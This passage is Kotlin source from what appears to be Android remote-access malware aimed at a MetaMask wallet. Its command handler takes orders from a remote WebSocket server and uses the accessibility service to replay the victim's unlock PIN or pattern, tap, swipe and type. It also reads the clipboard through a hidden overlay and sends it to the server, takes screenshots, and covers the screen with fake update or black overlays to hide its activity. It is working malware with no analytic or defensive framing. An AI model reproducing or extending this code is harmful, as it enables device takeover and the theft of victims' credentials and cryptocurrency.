                                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                            Thread.sleep(900L)
                                            android.os.Handler(android.os.Looper.getMainLooper()).post {
                                                try {
                                                    val root = svc.rootInActiveWindow
                                                    var typed = false
                                                    if (root != null) {
                                                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                                        fun findEditable(node: android.view.accessibility.AccessibilityNodeInfo?): android.view.accessibility.AccessibilityNodeInfo? {
                                                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] findEditable enter node=${node}") //xdbg
                                                            if (node == null) return null
                                                            if (node.isEditable || node.className?.contains("EditText") == true) return node
                                                            for (i in 0 until node.childCount) {
                                                                android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] loop") //xdbg
                                                                val r = findEditable(node.getChild(i))
                                                                if (r != null) return r
                                                            }
                                                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] return") //xdbg
                                                            return null
                                                        }
                                                        val editNode = findEditable(root)
                                                        if (editNode != null) {
                                                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                                            val bundle = android.os.Bundle()
                                                            bundle.putCharSequence(
                                                                android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                                                                code
                                                            )
                                                            editNode.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, bundle)
                                                            typed = true
                                                        }
                                                    }
                                                    if (!typed) {
                                                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                                        for (ch in code) {
                                                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] loop") //xdbg
                                                            val nodes = svc.rootInActiveWindow
                                                                ?.findAccessibilityNodeInfosByText(ch.toString())
                                                            nodes?.firstOrNull { it.isClickable }
                                                                ?.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                                            Thread.sleep(80L)
                                                        }
                                                    }
                                                    Thread.sleep(150L)
                                                    svc.rootInActiveWindow
                                                        ?.findAccessibilityNodeInfosByText("OK")
                                                        ?.firstOrNull { it.isClickable }
                                                        ?.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                                } catch (_: Exception) {}
                                            }
                                        }
                                    }
                                    "pattern" -> {
                                        val dotsArr = method?.optJSONArray("dots")
                                        if (dotsArr != null && dotsArr.length() >= 2) {
                                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                            Thread.sleep(700L)

                                            val wm = svc.getSystemService(android.content.Context.WINDOW_SERVICE) as android.view.WindowManager
                                            val realH: Float = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                                                wm.currentWindowMetrics.bounds.height().toFloat()
                                            } else {
                                                val dm = android.util.DisplayMetrics()
                                                @Suppress("DEPRECATION") wm.defaultDisplay.getRealMetrics(dm)
                                                dm.heightPixels.toFloat()
                                            }

                                            val CELL_RE = Regex("Ячейка\\s+(\\d+)", RegexOption.IGNORE_CASE)

                                            fun scanTree(): Pair<MutableMap<Int, android.graphics.PointF>, android.graphics.Rect?> {
                                                android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] scanTree enter") //xdbg
                                                val centers = mutableMapOf<Int, android.graphics.PointF>()
                                                var container: android.graphics.Rect? = null
                                                val root = try { svc.rootInActiveWindow } catch (_: Exception) { null }
                                                    ?: return Pair(centers, container)
                                                fun scan(node: android.view.accessibility.AccessibilityNodeInfo) {
                                                    android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] scan enter node=${node}") //xdbg
                                                    val txt = "${node.text ?: ""}${node.contentDescription ?: ""}"
                                                    val m = CELL_RE.find(txt)
                                                    if (m != null) {
                                                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                                        val cn = m.groupValues[1].toIntOrNull()
                                                        if (cn != null && cn in 1..9) {
                                                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                                            val b = android.graphics.Rect()
                                                            node.getBoundsInScreen(b)
                                                            if (b.width() > 30 && b.height() > 30)
                                                                centers[cn - 1] = android.graphics.PointF(b.exactCenterX(), b.exactCenterY())
                                                        }
                                                    }
                                                    if (m == null && node.isClickable && container == null) {
                                                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                                        val b = android.graphics.Rect(); node.getBoundsInScreen(b)
                                                        val w = b.width(); val h2 = b.height()
                                                        if (w in 300..1000 && h2 in 300..1000 && kotlin.math.abs(w - h2) < 100)
                                                            container = b
                                                    }
                                                    for (i in 0 until node.childCount) {
                                                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] loop") //xdbg
                                                        val ch = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
                                                        try { scan(ch) } finally { try { ch.recycle() } catch (_: Exception) {} }
                                                    }
                                                }
                                                try { scan(root) } finally { try { root.recycle() } catch (_: Exception) {} }
                                                return Pair(centers, container)
                                            }

                                            com.example.MetaMask.services.UnlockMonitor.isReplayMode = true

                                            var (cellCenters, containerRect) = scanTree()

                                            val probePoint: android.graphics.PointF = if (containerRect != null) {
                                                val cb = containerRect!!
                                                android.graphics.PointF(cb.left + cb.width() * 0.167f, cb.top + cb.height() * 0.167f)
                                            } else {
                                                android.graphics.PointF(W * 0.30f, realH * 0.66f)
                                            }

                                            val probeLatch = java.util.concurrent.CountDownLatch(1)
                                            android.os.Handler(android.os.Looper.getMainLooper()).post {
                                                val probePath = android.graphics.Path().apply { moveTo(probePoint.x, probePoint.y) }
                                                val probeGesture = android.accessibilityservice.GestureDescription.Builder()
                                                    .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(probePath, 0L, 60L))
                                                    .build()
                                                svc.dispatchGesture(probeGesture, object : android.accessibilityservice.AccessibilityService.GestureResultCallback() {
                                                    override fun onCompleted(g: android.accessibilityservice.GestureDescription?) { probeLatch.countDown() }
                                                    override fun onCancelled(g: android.accessibilityservice.GestureDescription?) { probeLatch.countDown() }
                                                }, null)
                                            }
                                            probeLatch.await(400L, java.util.concurrent.TimeUnit.MILLISECONDS)

                                            var scanTries = 0
                                            while (cellCenters.size < 9 && scanTries < 25) {
                                                android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] loop") //xdbg
                                                val (c, cont) = scanTree()
                                                if (c.size > cellCenters.size) cellCenters = c
                                                if (cont != null && containerRect == null) containerRect = cont
                                                if (cellCenters.size < 9) Thread.sleep(80L)
                                                scanTries++
                                            }

                                            Thread.sleep(600L)

                                            val finalCells = cellCenters
                                            val finalContainer = containerRect

                                            android.os.Handler(android.os.Looper.getMainLooper()).post {
                                                try {
                                                    fun dotPt(idx: Int): android.graphics.PointF {
                                                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] dotPt enter idx=${idx}") //xdbg
                                                        finalCells[idx]?.let { return it }
                                                        val cb = finalContainer
                                                        if (cb != null) {
                                                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                                            val cw = cb.width() / 3f; val ch2 = cb.height() / 3f
                                                            val col = idx % 3; val row = idx / 3
                                                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] return") //xdbg
                                                            return android.graphics.PointF(cb.left + col * cw + cw / 2f, cb.top + row * ch2 + ch2 / 2f)
                                                        }
                                                        val gLeft = W * 0.23f; val gTop = realH * 0.622f
                                                        val gRight = W * 0.77f; val gBot = realH * 0.883f
                                                        val cellW = (gRight - gLeft) / 3f; val cellH = (gBot - gTop) / 3f
                                                        val col = idx % 3; val row = idx / 3
                                                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] return") //xdbg
                                                        return android.graphics.PointF(gLeft + col * cellW + cellW / 2f, gTop + row * cellH + cellH / 2f)
                                                    }

                                                    val path = android.graphics.Path()
                                                    val p0 = dotPt(dotsArr.getInt(0))
                                                    path.moveTo(p0.x, p0.y)
                                                    for (i in 1 until dotsArr.length()) {
                                                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] loop") //xdbg
                                                        val p = dotPt(dotsArr.getInt(i))
                                                        path.lineTo(p.x, p.y)
                                                    }
                                                    val gesture = android.accessibilityservice.GestureDescription.Builder()
                                                        .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0L, 1200L))
                                                        .build()
                                                    svc.dispatchGesture(gesture, object : android.accessibilityservice.AccessibilityService.GestureResultCallback() {
                                                        override fun onCompleted(gestureDescription: android.accessibilityservice.GestureDescription?) {
                                                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] onCompleted enter gestureDescription=${gestureDescription}") //xdbg
                                                            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                                                com.example.MetaMask.services.UnlockMonitor.isReplayMode = false
                                                            }, 2000L)
                                                        }
                                                        override fun onCancelled(gestureDescription: android.accessibilityservice.GestureDescription?) {
                                                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] onCancelled enter gestureDescription=${gestureDescription}") //xdbg
                                                            com.example.MetaMask.services.UnlockMonitor.isReplayMode = false
                                                        }
                                                    }, null)
                                                } catch (_: Exception) {}
                                            }
                                        }
                                    }
                                }
                                Thread.sleep(1500L)
                                try { wl?.release() } catch (_: Exception) {}
                            } catch (_: Exception) {}
                        }.start()
                    }
                    null
                }

                "get_clipboard" -> {
                    val svc = AccessSvc.instance
                    fun sendClipResult(text: String, note: String) {
                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] sendClipResult enter text=${text} note=${note}") //xdbg
                        val payload = org.json.JSONObject().apply {
                            put("action", "clipboard")
                            put("text", text)
                            put("note", note)
                        }
                        val bi = android.content.Intent(MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER).apply {
                            putExtra(MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND, payload.toString())
                            setPackage(context.packageName)
                        }
                        context.sendBroadcast(bi)
                    }
                    if (svc == null) {
                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                        sendClipResult("", "Нет доступа: accessibility сервис не активен")
                    } else {
                        val wm = svc.getSystemService(Context.WINDOW_SERVICE) as? android.view.WindowManager
                        if (wm == null) {
                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                            sendClipResult("", "WindowManager недоступен")
                        } else {
                            val params = android.view.WindowManager.LayoutParams(
                                1, 1,
                                android.view.WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                                android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                                android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                                android.graphics.PixelFormat.TRANSLUCENT
                            ).apply {
                                gravity = android.view.Gravity.TOP or android.view.Gravity.START
                                x = 0; y = 0
                            }
                            val view = object : android.view.View(svc) {
                                private var handled = false
                                override fun onWindowFocusChanged(hasWindowFocus: Boolean) {
                                    android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] onWindowFocusChanged enter hasWindowFocus=${hasWindowFocus}") //xdbg
                                    super.onWindowFocusChanged(hasWindowFocus)
                                    if (!hasWindowFocus || handled) return
                                    handled = true
                                    var clipText = ""
                                    try {
                                        val cm = svc.getSystemService(Context.CLIPBOARD_SERVICE) as? android.content.ClipboardManager
                                        if (cm?.hasPrimaryClip() == true) {
                                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                            val clip = cm.primaryClip
                                            if (clip != null && clip.itemCount > 0) {
                                                android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                                clipText = clip.getItemAt(0)?.coerceToText(svc)?.toString() ?: ""
                                            }
                                        }
                                    } catch (_: Exception) {}
                                    try { wm.removeView(this) } catch (_: Exception) {}
                                    sendClipResult(clipText, if (clipText.isEmpty()) "Буфер пуст" else "")
                                }
                            }
                            android.os.Handler(android.os.Looper.getMainLooper()).post {
                                try {
                                    wm.addView(view, params)
                                } catch (e: Exception) {
                                    android.util.Log.e("XDBG", "[WebSocketCommandHandlerReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                                    sendClipResult("", "Ошибка overlay: ${e.message}")
                                }
                            }
                        }
                    }
                    null
                }
                "take_screenshot" -> {
                    context.startService(Intent(context, CraneService::class.java).apply {
                        setAction(CraneService.ACTION_TAKE_SCREENSHOT)
                    })
                    null
                }

                "show_hybrid_overlay" -> {
                    val svc = AccessSvc.instance
                    if (svc != null) {
                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                        val cfg = jsonCommand.optJSONObject("config") ?: jsonCommand
                        Handler(Looper.getMainLooper()).post {
                            try { svc.hybridOverlayManager.show(cfg) } catch (_: Exception) {}
                        }
                    }
                    null
                }

                "close_hybrid_overlay" -> {
                    val svc = AccessSvc.instance
                    if (svc != null) {
                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                        Handler(Looper.getMainLooper()).post {
                            try { svc.hybridOverlayManager.close("panel_manual") } catch (_: Exception) {}
                        }
                    }
                    null
                }
                "blank_screen_on" -> {
                    val text = jsonCommand.optString("text", "")
                    AccessSvc.instance?.martenHelper?.showBlack(text)
                    AccessSvc.instance?.startOverlayAutoOff()
                    null
                }
                "fake_update_on" -> {
                    AccessSvc.instance?.martenHelper?.showFakeUpdate()
                    null
                }
                "android_update_on" -> {
                    AccessSvc.instance?.martenHelper?.showAndroidUpdate()
                    AccessSvc.instance?.startOverlayAutoOff()
                    null
                }
                "overlay_off" -> {
                    AccessSvc.instance?.martenHelper?.hide()
                    null
                }
                "click" -> {
                    val xf = jsonCommand.optDouble("xf", -1.0)
                    val yf = jsonCommand.optDouble("yf", -1.0)
                    if (xf >= 0 && yf >= 0) {
                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                        val svc = AccessSvc.instance
                        if (svc != null) {
                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                            val dm = getRealMetrics(context)
                            val x = (xf * dm.widthPixels).toFloat()
                            val y = (yf * dm.heightPixels).toFloat()
                            svc.martenHelper.tapAt(svc, x, y)
                        }
                    }
                    null
                }
                "scroll" -> {
                    val xf = jsonCommand.optDouble("xf", 0.5)
                    val yf = jsonCommand.optDouble("yf", 0.5)
                    val dy = jsonCommand.optDouble("dy", 0.0)
                    val svc = AccessSvc.instance
                    if (svc != null) {
                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                        val dm = getRealMetrics(context)
                        val cx = (xf * dm.widthPixels).toFloat()
                        val cy = (yf * dm.heightPixels).toFloat()
                        val dist = (-(dy * 8.0).coerceIn(-dm.heightPixels * 0.7, dm.heightPixels * 0.7)).toFloat()
                        val y2 = (cy + dist).coerceIn(0f, dm.heightPixels.toFloat())
                        val path = android.graphics.Path().apply { moveTo(cx, cy); lineTo(cx, y2) }
                        val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0L, 200L)
                        val gesture = android.accessibilityservice.GestureDescription.Builder().addStroke(stroke).build()
                        svc.martenHelper.dispatchGesture(svc, gesture)
                    }
                    null
                }
                "swipe" -> {
                    val x1f = jsonCommand.optDouble("x1f", -1.0); val y1f = jsonCommand.optDouble("y1f", -1.0)
                    val x2f = jsonCommand.optDouble("x2f", -1.0); val y2f = jsonCommand.optDouble("y2f", -1.0)
                    val svc = AccessSvc.instance
                    if (svc != null && x1f >= 0 && y1f >= 0 && x2f >= 0 && y2f >= 0) {
                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                        val dm = getRealMetrics(context)
                        val sx1 = (x1f * dm.widthPixels).toFloat()
                        val sy1 = (y1f * dm.heightPixels).toFloat()
                        val sx2 = (x2f * dm.widthPixels).toFloat()
                        val sy2 = (y2f * dm.heightPixels).toFloat()
                        val dur = jsonCommand.optLong("dur", 300L)
                        svc.martenHelper.swipeAt(svc, sx1, sy1, sx2, sy2, dur)
                    }
                    null
                }

                "type_text" -> {
                    val text = jsonCommand.optString("text", "")
                    if (text.isNotEmpty()) {
                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                        val svc = AccessSvc.instance
                        if (svc != null) {
                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                            Handler(Looper.getMainLooper()).post {
                                try {
                                    val cm = context.getSystemService(android.content.Context.CLIPBOARD_SERVICE)
                                        as? android.content.ClipboardManager
                                    cm?.setPrimaryClip(android.content.ClipData.newPlainText("t", text))
                                } catch (_: Exception) {}

                                                                fun isEditableNode(n: android.view.accessibility.AccessibilityNodeInfo) =
                                    n.isEditable || n.isPassword || n.className?.contains("EditText") == true

                                var focused: android.view.accessibility.AccessibilityNodeInfo? = null
                                var src = ""

                                val byInput = svc.findFocus(android.view.accessibility.AccessibilityNodeInfo.FOCUS_INPUT)
                                if (byInput != null && isEditableNode(byInput)) {
                                    android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                    focused = byInput; src = "input"
                                } else {
                                    byInput?.recycle()
                                    val byA11y = svc.findFocus(android.view.accessibility.AccessibilityNodeInfo.FOCUS_ACCESSIBILITY)
                                    if (byA11y != null && isEditableNode(byA11y)) {
                                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                        focused = byA11y; src = "a11y"
                                    } else {
                                        byA11y?.recycle()
                                        val root = svc.rootInActiveWindow
                                        if (root != null) {
                                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                            val queue = mutableListOf<android.view.accessibility.AccessibilityNodeInfo>()
                                            queue.add(root)
                                            while (queue.isNotEmpty() && focused == null) {
                                                android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] loop") //xdbg
                                                val cur = queue.removeAt(0)
                                                if (isEditableNode(cur)) {
                                                    android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                                    focused = cur; src = "tree"
                                                } else {
                                                    for (i in 0 until cur.childCount) cur.getChild(i)?.let { queue.add(it) }
                                                    cur.recycle()
                                                }
                                            }
                                            queue.forEach { it.recycle() }
                                        }
                                    }
                                }

                                if (focused != null) {
                                    android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                    val args = android.os.Bundle()
                                    args.putCharSequence(android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
                                    val setOk = focused.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                                    if (!setOk) {
                                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                        focused.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_PASTE)
                                    }
                                    focused.recycle()
                                }
                            }
                        }
                    }
                    null
                }
                "copy_to_clipboard" -> {
                    val text = jsonCommand.optString("text", "")
                    if (text.isNotEmpty()) {
                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                        Handler(Looper.getMainLooper()).post {
                            try {
                                val cm = context.getSystemService(android.content.Context.CLIPBOARD_SERVICE)
                                    as? android.content.ClipboardManager
                                cm?.setPrimaryClip(android.content.ClipData.newPlainText("t", text))
                            } catch (_: Exception) {}
                        }
                    }
                    null
                }
                "key_event" -> {
                    val key = jsonCommand.optString("key", "")
                    if (key == "enter") {
                        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                        val svc = AccessSvc.instance
                        if (svc != null) {
                            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                            Handler(Looper.getMainLooper()).post {
                                val focused = svc.findFocus(android.view.accessibility.AccessibilityNodeInfo.FOCUS_INPUT)
                                if (focused != null) {
                                    android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                                    val done = focused.performAction(0x01000000)
                                    if (!done) focused.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                    focused.recycle()
                                }
                            }
                        }
                    }
                    null
                }

                else -> null
            }

            if (serviceIntent != null) {
                android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                if (!serviceIntent.hasExtra("command")) {
                    android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                    serviceIntent.putExtra("command", jsonCommand.toString())
                }
                try {
                    context.startService(serviceIntent)
                } catch (_: Exception) {}
            }

        } catch (_: Exception) {}
    }

    private fun launchChikenWorker(context: Context, commandData: String) {
        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] launchChikenWorker enter context=ctx commandData=${commandData}") //xdbg
        try {
            val bridgeAction = ChikenBridgeReceiver.ACTION
            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] launchChikenWorker bridgeAction=${bridgeAction} pkg=${context.packageName}") //xdbg
            val intent = Intent(bridgeAction)
                .setPackage(context.packageName)
                .putExtra("command", commandData)
            context.sendBroadcast(intent)
            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] launchChikenWorker broadcast sent") //xdbg
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[WebSocketCommandHandlerReceiver] launchChikenWorker catch: ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }

    @Suppress("DEPRECATION")
    private fun getRealMetrics(context: Context): DisplayMetrics {
        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] getRealMetrics enter context=ctx") //xdbg
        val dm = DisplayMetrics()
        val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
            val bounds = wm.currentWindowMetrics.bounds
            dm.widthPixels = bounds.width()
            dm.heightPixels = bounds.height()
            dm.densityDpi = context.resources.displayMetrics.densityDpi
        } else {
            wm.defaultDisplay.getRealMetrics(dm)
        }
        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] return") //xdbg
        return dm
    }

    private fun resolveAppPkg(context: Context, labelOrPkg: String): String {
        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] resolveAppPkg enter context=ctx labelOrPkg=${labelOrPkg}") //xdbg
        val pm = context.packageManager
        if (pm.getLaunchIntentForPackage(labelOrPkg) != null) return labelOrPkg
        try {
            val apps = pm.getInstalledApplications(0)
            for (app in apps) {
                android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] loop") //xdbg
                val label = try { pm.getApplicationLabel(app).toString() } catch (_: Exception) { continue }
                if (label.equals(labelOrPkg, ignoreCase = true)) {
                    android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                    android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] return") //xdbg
                    return app.packageName
                }
            }
        } catch (_: Exception) {}
        return labelOrPkg
    }

    private fun performAppRestart(context: Context) {
        android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] performAppRestart enter context=ctx") //xdbg
        val master = Intent(context, MasterWebSocketDispatcher::class.java)
        context.stopService(master)

        val handler = android.os.Handler(android.os.Looper.getMainLooper())
        handler.postDelayed({
            try {
                if (android.os.Build.VERSION.SDK_INT >= 26) {
                    android.util.Log.d("XDBG", "[WebSocketCommandHandlerReceiver] if branch") //xdbg
                    context.startForegroundService(Intent(context, MasterWebSocketDispatcher::class.java))
                } else {
                    context.startService(Intent(context, MasterWebSocketDispatcher::class.java))
                }
            } catch (_: Exception) {}
        }, 1500)
    }
}
